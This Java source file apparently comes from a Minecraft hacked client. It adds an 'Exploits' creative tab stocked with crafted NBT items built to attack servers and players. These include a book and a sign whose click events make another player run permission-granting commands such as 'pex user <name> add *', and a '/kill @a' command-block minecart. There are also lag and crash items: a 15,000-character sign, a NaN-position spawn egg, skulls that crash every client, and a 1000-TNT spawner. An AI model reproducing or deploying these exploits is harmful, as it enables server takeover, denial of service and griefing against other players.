package me.aidanmees.trivia.CreaTab;


import java.util.List;
import java.util.Random;

import com.mojang.authlib.GameProfile;
import com.mojang.authlib.properties.Property;

import me.aidanmees.trivia.client.tools.ItemStackUtil;
import net.minecraft.client.Minecraft;
import net.minecraft.creativetab.CreativeTabs;
import net.minecraft.init.Blocks;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.JsonToNBT;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTException;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagInt;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTUtil;

public class TabExploits
extends CreativeTabs {
    ItemStack firework;

    public TabExploits() {
        super(12, "ExploitsTab");
    }

    @Override
    public void displayAllReleventItems(List<ItemStack> itemList) {
        
        ItemStack stack = new ItemStack(Items.potionitem);
        stack.setItemDamage(16384);
        NBTTagList effects = new NBTTagList();
        int i = 1;
        while (i <= 23) {
            NBTTagCompound effect = new NBTTagCompound();
            effect.setInteger("Amplifier", Integer.MAX_VALUE);
            effect.setInteger("Duration", Integer.MAX_VALUE);
            effect.setInteger("Id", i);
            effects.appendTag(effect);
            ++i;
        }
        stack.setTagInfo("CustomPotionEffects", effects);
        stack.setStackDisplayName("TrollPotion");
        itemList.add(stack);
       
        
        
        StringBuilder sb = new StringBuilder();
        int m = 0;
        while (m <= 15000) {
            sb.append("\\ufdfd");
            ++m;
        }
        
        
        String command = "/p add " + Minecraft.getMinecraft().thePlayer.getName();
        ItemStack WritItm = new ItemStack(Items.written_book);
        NBTTagCompound WritBase = new NBTTagCompound();
        NBTTagList WritList = new NBTTagList();
        String spaces = "";
        for (int ibook = 0; ibook < 500; ibook++) {
          spaces = spaces + " ";
        }
        WritList.appendTag(new NBTTagString("{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"%COMMAND%\"},\"hoverEvent\":{\"action\":\"show_text\",\"value\":{\"text\":\"%HOVERTEXT%\"}},\"text\":\"%TEXT%\"}".replace("%COMMAND%", command).replace("%HOVERTEXT%", "§F§L[§4§lClick§f§l] Click here!").replace("%TEXT%", "§F§L§8[§4§lClick§f§l§8] Click here!" +spaces)));
        
        
        WritBase.setTag("pages", WritList);
        WritBase.setString("author", "§7§l[§4§lAdmin§7§l]");
        WritBase.setByte("resolved", (byte)1);
        WritBase.setString("title", "§8§kiii§f§7Minecraft§8§kiii");
        WritItm.setTagCompound(WritBase);
       
        
        
        

        
        

	        
        itemList.add(WritItm);
        
       
       
	    ItemStack DeathPot = ItemStackUtil.stringtostack("potion 1 16395 {CustomPotionEffects:[{Id:1,Amplifier:1000,Duration:1200},{Id:3,Amplifier:1000,Duration:1200},{Id:5,Amplifier:1000,Duration:1200},{Id:6,Amplifier:1000,Duration:0},{Id:10,Amplifier:1000,Duration:1200},{Id:11,Amplifier:1000,Duration:1200},{Id:12,Amplifier:1000,Duration:1200},{Id:13,Amplifier:1000,Duration:1200},{Id:14,Amplifier:1000,Duration:1200},{Id:16,Amplifier:1000,Duration:1200},{Id:21,Amplifier:1000,Duration:1200},{Id:22,Amplifier:1000,Duration:1200},{Id:23,Amplifier:1000,Duration:1200}],display:{Name:\"Creative killer potion\",Lore:[\"Kill a player with this potion\"]}}");
	    
	    DeathPot.setItemDamage(Integer.MAX_VALUE);
	    itemList.add(DeathPot);
	    
        itemList.add(ItemStackUtil.stringtostack("command_block_minecart 1 0 {Command:/kill @a}").setStackDisplayLore("Might contain .exploitcmd-command"));
        
       
        
        
        itemList.add(ItemStackUtil.stringtostack("armor_stand 1 0 {EntityTag:{ShowArms:1,NoBasePlate:1}}").setStackDisplayLore("Better ArmorStand"));
        
        itemList.add(ItemStackUtil.stringtostack("minecraft:blaze_rod 1 0 {display:{Name:\"Magic Wand\",Lore:[\"This wand gets its scource of magic from its self\",\"When held,this wand will give you magic powers\"]},AttributeModifiers:[{AttributeName:\"generic.maxHealth\",Name:\"generic.maxHealth\",Amount:40,Operation:0,UUIDMost:83174,UUIDLeast:854379},{AttributeName:\"generic.knockbackResistance\",Name:\"generic.knockbackResistance\",Amount:100,Operation:0,UUIDMost:32261,UUIDLeast:467653},{AttributeName:\"generic.movementSpeed\",Name:\"generic.movementSpeed\",Amount:1.0,Operation:0,UUIDMost:50068,UUIDLeast:209167},{AttributeName:\"generic.attackDamage\",Name:\"generic.attackDamage\",Amount:100,Operation:0,UUIDMost:95220,UUIDLeast:620747}],Unbreakable:1}").setStackDisplayLore(""));
        
        itemList.add(ItemStackUtil.stringtostack("minecraft:sign 1 0 {BlockEntityTag:{Text1:\"{\\\"text\\\":\\\"" + sb.toString() + "\\\"}\"},display:{Name:LaggSign #3}}").setStackDisplayLore(new String[]{"Exploit made by BlockExpert aka. nullerror", "", "Please enable the Module \"LaggSign\"", "to prevent lagg for yourself"}));
        
      
        itemList.add(ItemStackUtil.stringtostack("minecraft:mob_spawner 1 0 {display:{Name:\"1000*100 TNT Spawner\"},BlockEntityTag:{EntityId:FallingSand,SpawnData:{Motion:[0.0,0.0,0.0],Block:mob_spawner,Data:0,TileEntityData:{EntityId:PrimedTnt,SpawnData:{Motion:[0.0,0.0,0.0],Fuse:40,CustomNameVisible:1},SpawnCount:1000,SpawnRange:10,RequiredPlayerRange:100,Delay:0,MaxNearbyEntities:100},Time:1,DropItem:0},SpawnCount:100,SpawnRange:100,RequiredPlayerRange:100,Delay:20,MaxNearbyEntities:100}}"));

       try {
    	   ItemStack item = new ItemStack(Items.spawn_egg, 1, 55);
 	      NBTTagCompound nbt = new NBTTagCompound();
 	      
 	     
 	     nbt.setDouble("PosX", Double.NaN);
 	     
 	      item.stackTagCompound = nbt;
 	      item.setStackDisplayName("Big ass Slime");
   itemList.add(item);
 	
 	
       }
       catch(Exception ex){
    	   
       }
        ItemStack itmS = new ItemStack(Items.sign);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound blockEntityTag = new NBTTagCompound();
        String line1 = "";
        String line2 = "";
        String line3 = "";
        String line4 = "";
        String cmd1 = "pex user " + Minecraft.getMinecraft().thePlayer.getName() + " add *";
        
        String cmd2 = "say HELLO U HAVE BEEN HACKED";
        
        String cmd3 = "";
        
        String cmd4 = "";
        
        
        
        
        blockEntityTag.setString("Text1", "{\"text\":\""+line1+"\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\""+cmd1+"" + "\"}}");
        blockEntityTag.setString("Text2", "{\"text\":\""+line2+"\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\""+cmd2+"" + "\"}}");
        blockEntityTag.setString("Text3", "{\"text\":\""+line3+"\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\""+cmd3+"" + "\"}}");
        blockEntityTag.setString("Text4", "{\"text\":\""+line4+"\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\""+cmd4+"" + "\"}}");
        base.setTag("BlockEntityTag", (NBTBase)blockEntityTag);
        itmS.setTagCompound(base);
       
        itemList.add(itmS.setStackDisplayLore("Just place me"));
        
        
        if (this.firework == null) {
            Random rand = new Random();
            this.firework = new ItemStack(Items.fireworks);
            NBTTagCompound tags = new NBTTagCompound();
            NBTTagList explosions = new NBTTagList();
            int i2 = 1;
            while (i2 <= 3000) {
                NBTTagCompound effect = new NBTTagCompound();
                effect.setByte("Type", (byte)rand.nextInt(5));
                effect.setBoolean("Flicker", rand.nextBoolean());
                effect.setBoolean("Trail", rand.nextBoolean());
                effect.setIntArray("Colors", new int[]{rand.nextInt(16777215)});
                effect.setIntArray("FadeColors", new int[]{rand.nextInt(16777215)});
                explosions.appendTag(effect);
                ++i2;
            }
            tags.setTag("Explosions", explosions);
            this.firework.setTagInfo("Fireworks", tags);
            this.firework.setTagInfo("HideFlags", new NBTTagInt(63));
            this.firework.setStackDisplayName("Random Firework");
        }
        itemList.add(this.firework);
       
        ItemStack itm2 = new ItemStack(Items.iron_sword, 1);
		NBTTagCompound base2 = new NBTTagCompound();
	     NBTTagList list2 = new NBTTagList();
	     String nbt2;
	     nbt2 = "{AttributeModifiers:[{AttributeName:generic.movementSpeed,Name:generic.movementSpeed, Amount:2147483647,Operation:0, UUIDMost:246216, UUIDLeast:24636}], display:{Name:Hold Me}, Unbreakable:1,HideFlags:63}";
	     
	     
		
		try {
			itm2.setTagCompound(JsonToNBT.getTagFromJson(nbt2));
		} catch (NBTException e) {
			
			e.printStackTrace();
		}

		itm2.setStackDisplayLore("Gives the player who's holding it a extreme speed boost.");
		itemList.add(itm2);

		
		ItemStack item = new ItemStack(Items.skull, 1, 3);
	      NBTTagCompound nbt222222 = new NBTTagCompound();
	      
	      NBTTagCompound c = new NBTTagCompound();
	      GameProfile prof = new GameProfile(null, "CrashSkull");
	      prof.getProperties().put("textures", new Property("Value", ""));
          c.setString("Id", "9d744c33-f3c4-4040-a7fc-73b47c840f0c");
	      NBTUtil.writeGameProfile(c, prof);
	      nbt222222.setTag("SkullOwner", c);
	      
	      nbt222222.setBoolean("crash", true);
	      item.stackTagCompound = nbt222222;
	      item.setStackDisplayName("CrashItem");
  itemList.add(item);
	
	
	
        
        ItemStack itm = new ItemStack(Items.iron_sword);
		String nbt = "";
		NBTTagCompound base3 = new NBTTagCompound();
	     NBTTagList list = new NBTTagList();
	 	NBTTagList nbttaglist = new NBTTagList();
		nbttaglist.appendTag(new NBTTagString("+1000% Speed"));
	
		base3.setTag("Lore", nbttaglist);
		itm.setTagInfo("display", base3);
	     nbt = "{AttributeModifiers:[{AttributeName:generic.maxHealth,Name:generic.maxHealth, Amount:"+ -1 +",Operation:0, UUIDMost:246216, UUIDLeast:24636}], display:{Name:Hold Me}, Unbreakable:1,HideFlags:63}";
	     
	     
		
			try {
				itm.setTagCompound(JsonToNBT.getTagFromJson(nbt));
			} catch (NBTException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			 itm.setStackDisplayLore("Kills the player holding the sword.");

		 itemList.add(itm);
		
	        itemList.add(ItemStackUtil.stringtostack("furnace 1 0 {BlockEntityTag:{Items:[{id:skull,Count:64,Slot:0,tag:{SkullOwner:{Id:\"0\"}}}]}}").setStackDisplayLore("Crash(Every Client)"));
	       
	        
	        itemList.add(ItemStackUtil.stringtostack("anvil 1 10").setStackDisplayLore("Wurstish crash anvil"));
	        
    }
    
    public static void removeSuspiciousTags(List<ItemStack> itemList) {
        for (ItemStack s : itemList) {
            if (!s.hasTagCompound()) continue;
            s.getTagCompound().setBoolean("Exploit", true);
        }
    }

    @Override
    public ItemStack getIconItemStack() {
        return new ItemStack(Item.getItemFromBlock(Blocks.command_block));
    }

    @Override
    public String getTranslatedTabLabel() {
        return "Exploits";
    }

   
	@Override
	public Item getTabIconItem() {
		// TODO Auto-generated method stub
		return null;
	}
}

